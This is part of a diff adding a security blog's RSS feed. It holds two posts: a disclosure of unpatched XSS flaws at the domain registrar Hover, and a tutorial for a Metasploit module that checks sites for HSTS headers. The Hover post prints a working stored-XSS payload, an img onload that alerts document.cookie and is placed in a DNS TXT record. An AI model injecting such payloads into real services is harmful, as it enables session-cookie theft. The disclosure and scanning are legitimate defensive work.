+        &lt;img src=&#34;https://www.mattandreko.com/img/hover_second_xss.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;This really depressed me, since I have spent my fair share of time being a developer, and I always tried to actually &lt;i&gt;fix&lt;/i&gt;problems, instead of just making the symptom go away. Again, I reported the issue, hoping that I&amp;rsquo;d get another quick turnaround. I asked them to reply within 30 days to indicate their intent on coordinating efforts for remediation. I waited, but I still have no response from them, and it&amp;rsquo;s been over 30 days. I still can&amp;rsquo;t believe they couldn&amp;rsquo;t even respond with a, &amp;ldquo;We&amp;rsquo;re working on it&amp;rdquo;, response.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-billing-issue&#34;&gt;The billing issue&lt;/h2&gt;
+
+&lt;p&gt;I received an email from &lt;a href=&#34;http://www.hover.com&#34;&gt;Hover&lt;/a&gt; about a domain name of mine expiring soon. I went into my account, and saw that the credit card was expired, so I went to update it. Unfortunately, I got this error instead:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Declined by Fraud Service&lt;/p&gt;
+&lt;/blockquote&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hover_fraud.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Now, I figured that it was some sort of error, and tried filling it out a couple more times, verifying my card number was correct.After-all, I was only updating the expiration date, nothing else. Unfortunately, all this resulted in were several temporary one dollar charges on my credit card.&lt;/p&gt;
+
+&lt;p&gt;Again, I contacted &lt;a href=&#34;http://www.hover.com&#34;&gt;Hover&lt;/a&gt; and was disappointed yet again. I stated that I was trying to update my credit card details, and instead they renewed my domain for another year, and said, &amp;ldquo;it failed when you placed the order, but I was able to renew it on my end&amp;rdquo;. I was a bit upset because I hadn&amp;rsquo;t yet decided if I was going to renew through them or not yet, due to the previous security issues. I replied back that it still wasn&amp;rsquo;t helping me for my other domains that will need renewed at some point, and was given these instructions to help troubleshoot:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Use only the first and last name, no middle initial.&lt;/li&gt;
+&lt;li&gt;Change the phone number to numbers only, no hyphens.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The first one was a bit odd, since most credit card processors want your name &lt;i&gt;exactly&lt;/i&gt;as it shows on the card. I complied, but it did not help. The second issue I thought was absurd because if their system didn&amp;rsquo;t allow hyphens, why didn&amp;rsquo;t they prevent the user from entering them? This is exactly what javascript validation is for. (Note that they should also validate it on the server-side as well)&lt;/p&gt;
+
+&lt;p&gt;Their next steps were to have me call, and give them my credit card number over the phone, and have a billing statement ready to verify every bit of information, as if I&amp;rsquo;ve never used a credit card on a website before. It was a bit insulting.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-0-day-security-issue&#34;&gt;The 0-day security issue&lt;/h2&gt;
+
+&lt;p&gt;I had recently read an &lt;a href=&#34;http://www.skullsecurity.org/blog/2010/stuffing-javascript-into-dns-names&#34;&gt;article&lt;/a&gt; on inserting javascript into DNS to be used for exploitation. I was tinkering with this idea on my own domain names. Unfortunately, I ended up trying to diagnose why none of the DNS records I created in &lt;a href=&#34;http://www.hover.com&#34;&gt;Hover&amp;rsquo;s&lt;/a&gt; DNS Manager ever made it to their public DNS servers. I&amp;rsquo;m guessing they have some filtering on the back-end. Eventually I found that their DNS manager was also vulnerable to Cross-Site Scripting:&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hover_persistent_xss.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;This time, it&amp;rsquo;s a persistent Cross-Site Scripting vulnerability. Every time I navigate to my DNS management screen, I now get a dialog with my cookie. All a user had to do was add a TXT record with the following data:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;lt;img src=&amp;lsquo;&lt;a href=&#34;https://drupal.org/files/images/sup-dog-magnet-c117515921.jpeg&#39;&#34;&gt;https://drupal.org/files/images/sup-dog-magnet-c117515921.jpeg&#39;&lt;/a&gt; onload=&amp;lsquo;javascript:alert(document.cookie)\;&amp;rsquo;&amp;gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;They apparently do not even try to filter user-input at all. It&amp;rsquo;s quite depressing.&lt;/p&gt;
+
+&lt;h2 id=&#34;conclusion-tl-dr-http-www-urbandictionary-com-define-php-term-tl-3bdr&#34;&gt;Conclusion (&lt;a href=&#34;http://www.urbandictionary.com/define.php?term=tl%3Bdr&#34;&gt;tl;dr&lt;/a&gt;)&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.hover.com&#34;&gt;Hover&lt;/a&gt; seems to suffer from the inability to filter user-input. This has become a big problem over the last few years. There are many attacks stemming from this seemingly simple attack. I did my best, and tried reporting to them, but they seem unresponsive, and even when they are, it&amp;rsquo;s not always useful.&lt;/p&gt;
+
+&lt;p&gt;I will be moving my domains elsewhere. I haven&amp;rsquo;t yet decided where, and I have a bit of time, but I just don&amp;rsquo;t feel safe keeping my data stored somewhere that can&amp;rsquo;t even stop basic &lt;a href=&#34;https://www.owasp.org/index.php/Top_10_2013-T10&#34;&gt;OWASP Top 10&lt;/a&gt; vulnerabilities on their main page.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>HSTS Metasploit Module</title>
+      <link>https://www.mattandreko.com/blog/2013-02-21-hsts-metasploit-module/</link>
+      <pubDate>Thu, 21 Feb 2013 13:20:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2013-02-21-hsts-metasploit-module/</guid>
+      <description>
+
+&lt;p&gt;I have been working as a security consultant for a few months now, and one finding that is on almost every webserver I come across, is the lack of an &lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security&#34;&gt;HSTS (HTTP Strict Transport Security)&lt;/a&gt; implementation. This is understandable, since HSTS is still fairly new. In fact, before starting at &lt;a href=&#34;http://www.accuvant.com&#34;&gt;Accuvant&lt;/a&gt;, I had never heard of it either! However, since most browsers support it now, I wanted to be able to report on it. As of the time of this post, &lt;a href=&#34;https://www.rapid7.com/products/nexpose&#34;&gt;Nexpose&lt;/a&gt; does not have a finding for this item, but I believe &lt;a href=&#34;http://www.tenable.com/products/nessus&#34;&gt;Nessus&lt;/a&gt; does. To report on this finding, and provide a screenshot evidence to customers, we were often resorting to manually looking at the headers, or implementing home-made scripts to do it.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h2 id=&#34;wait-hsts-what-are-you-talking-about&#34;&gt;Wait, HSTS? What are you talking about?&lt;/h2&gt;
+
+&lt;p&gt;When you visit a website over unsecured HTTP, it&amp;rsquo;s often considered a best practice to do a 302 redirect to the HTTPS site. That way, when browser users just type in the domain, it gets redirected to the secure site. When the &amp;ldquo;Strict-Transport-Security&amp;rdquo; header is added to the HTTPS response, the client then knows for a certain amount of time (based on the header&amp;rsquo;s value) to ONLY request the HTTPS version of the site. This can greatly reduce the chances of phishing.&lt;/p&gt;
+
+&lt;p&gt;One convenient thing that will occur with HSTS, is that even if you make requests to the HTTP version of the site, the browser will actually bypass that, and request straight from the HTTPS site. This prevents leaks that often occur with images, stylesheets, and scripts.&lt;/p&gt;
+
+&lt;h2 id=&#34;get-to-the-module-already&#34;&gt;Get to the module already!&lt;/h2&gt;
+
+&lt;p&gt;The crew over on the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; team were really quick adding this module, which isn&amp;rsquo;t surprising since it was super easy to implement. I was honestly surprised that nobody had done it already. The code can be found &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/http_hsts.rb&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;so-how-do-i-use-this-thing&#34;&gt;So how do I use this thing?&lt;/h2&gt;
+
+&lt;p&gt;The usage is pretty simple. First, load up Metasploit and gaze at the ASCII-art:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;420-1572-man:~ mandreko$ msfconsole
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V4                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 4 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           http://metasploit.pro
+
+
+       =[ metasploit v4.6.0-dev [core:4.6 api:1.0]
++ -- --=[ 1048 exploits - 589 auxiliary - 174 post
++ -- --=[ 275 payloads - 28 encoders - 8 nops
+
+msf &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, just load up the HSTS Scanner module and look at the options:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/http/http_hsts 
+msf  auxiliary(http_hsts) &amp;gt; show options
+
+Module options (auxiliary/scanner/http/http_hsts):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        Use a proxy chain
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    443              yes       The target port
+   SSL      true             yes       Negotiate SSL for outgoing connections
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host
+
+msf  auxiliary(http_hsts) &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Add the hosts that you want to scan, by setting the &amp;ldquo;RHOSTS&amp;rdquo; variable:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf  auxiliary(http_hsts) &amp;gt; set rhosts www.paypal.com, www.google.com, www.yahoo.com, www.wikipedia.org
+rhosts =&amp;gt; www.paypal.com, www.google.com, www.yahoo.com, www.wikipedia.org
+msf  auxiliary(http_hsts) &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once you&amp;rsquo;re ready, just run the module:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf  auxiliary(http_hsts) &amp;gt; run
+
+[+] 23.65.2.234:443 - Strict-Transport-Security:max-age=14400, max-age=14400
+[-] 74.125.131.99:443 No HSTS found.
+[*] Scanned 02 of 18 hosts (011% complete)
+[-] 74.125.131.104:443 No HSTS found.
+[-] 74.125.131.106:443 No HSTS found.
+[*] Scanned 04 of 18 hosts (022% complete)
+[-] 74.125.131.147:443 No HSTS found.
+[-] 74.125.131.105:443 No HSTS found.
+[*] Scanned 06 of 18 hosts (033% complete)
+[-] 74.125.131.103:443 No HSTS found.
+[*] Scanned 08 of 18 hosts (044% complete)
+[-] 98.139.183.24:443 No HSTS found.
+[*] Scanned 09 of 18 hosts (050% complete)
+[*] Scanned 11 of 18 hosts (061% complete)
+[*] Scanned 13 of 18 hosts (072% complete)
+[*] Scanned 15 of 18 hosts (083% complete)
+[-] 208.80.154.225:443 No HSTS found.
+[*] Scanned 17 of 18 hosts (094% complete)
+[*] Scanned 18 of 18 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf  auxiliary(http_hsts) &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can see that out of all of those hosts, paypal.com (23.65.2.234) was the only one that implemented the HSTS header.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
